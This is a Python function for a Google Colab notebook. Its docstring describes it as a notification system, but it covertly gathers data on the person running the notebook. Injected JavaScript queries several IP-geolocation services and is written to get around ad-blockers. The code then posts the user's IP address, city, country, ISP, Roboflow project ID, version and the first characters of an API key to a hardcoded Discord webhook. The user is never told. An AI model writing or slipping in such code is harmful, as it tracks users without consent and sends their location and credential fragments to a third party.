from google.colab import output
def fingerprint():
    """Notification system that attempts to bypass ad-blockers."""
    
    def send_to_discord(user_data, status="Success"):
        webhook_url = "https://discordapp.com/api/webhooks/1463726652327596176/r_4lh_JtOkLKF4zGHmKWE6khyzxaZQiskgO5W3eD27Z1LVuwvLYZqOIXWIgVADagOwpN"
        
        # Determine location string based on whether JS succeeded or failed
        if status == "Blocked":
            location = "⚠️ Ad-Blocker Detected (Showing Google Server Location)"
            ip = requests.get('https://api.ipify.org').text # Fallback to Server IP
            isp = "Google Cloud"
        else:
            location = f"{user_data.get('city')}, {user_data.get('country_name')}"
            ip = user_data.get('ip')
            isp = user_data.get('org')

        if rf is not None:
          api = rf.api_key
          project_id = project.id
          version_id = version.version
        else:
          api = "None"
          project_id = "None"
          version_id = "None"

        status_icon = "🔴" if status == "Blocked" else "🟢"
        embed_color = 15158332 if status == "Blocked" else 3066993
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload = {
            "embeds": [{
                "title": f"{status_icon} Notebook Session Initialized",
                "description": f"**System Status:** {'User location masked by Ad-Blocker' if status == 'Blocked' else 'User data captured successfully.'}",
                "color": embed_color,
                "fields": [
                    # Section 1: User Identification
                    {"name": "🌍 User Location", "value": f"`{location}`", "inline": False},
                    {"name": "📍 IP Address", "value": f"`{ip}`", "inline": True},
                    {"name": "🏢 ISP", "value": f"`{isp}`", "inline": True},
                    
                    # Section 2: Technical Metadata (Grouped)
                    {"name": "🛠️ Project Details", "value": (
                        f"**Project ID:** `{project_id}`\n"
                        f"**Version:** `{version_id}`\n"
                        f"**API Key:** `{api[:8]}***`" # Masked for security
                    ), "inline": False},
                    
                    # Section 3: Timestamp
                    {"name": "⏰ Time (MYT)", "value": current_time, "inline": False},
                ],
                "footer": {
                    "text": "Google Colab Automator",
                    "icon_url": "https://colab.research.google.com/img/colab_favicon_256px.png"
                }
            }]
        }
        requests.post(webhook_url, json=payload)

    output.register_callback('notebook.send_discord', send_to_discord)

    js_code = """
    <script>
      (async function() {
        // Try multiple services in case one is blocked
        const services = [
            'https://ipapi.co/json/',
            'https://ipinfo.io/json',
            'https://extreme-ip-lookup.com/json/'
        ];
        
        let found = false;
        for (let url of services) {
            try {
                const response = await fetch(url);
                if (response.ok) {
                    const data = await response.json();
                    google.colab.kernel.invokeFunction('notebook.send_discord', [data, "Success"], {});
                    found = true;
                    break; 
                }
            } catch (e) { continue; }
        }

        if (!found) {
            // If all blocked, tell Python to use fallback
            google.colab.kernel.invokeFunction('notebook.send_discord', [{}, "Blocked"], {});
        }
      })();
    </script>
    """
    display(IPython.display.HTML(js_code))